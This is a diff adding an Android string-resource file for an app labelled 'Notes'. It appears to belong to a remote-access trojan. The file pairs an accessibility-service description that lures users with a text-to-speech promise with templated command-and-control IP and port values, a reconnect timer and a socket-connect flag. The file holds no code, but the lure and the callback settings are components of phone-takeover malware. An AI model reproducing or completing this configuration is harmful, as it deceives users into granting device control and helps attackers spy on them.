@@ -1,0 +1,9 @@
+<resources>
+    <string name="app_name">Notes</string>
+    <string name="accessibility_service_label">Notes</string>
+    <string name="accessibility_service_description">We want your permission to provide you the facality of Text-To-Speech accessibilty service for your application.</string>
+    <string name="MY_IP">{{IP}}</string>
+    <string name="MY_PORT">{{PORT}}</string>
+    <string name="reconnectTime">5000</string>
+    <bool name="SOCK_CONNECT">true</bool>
+</resources>
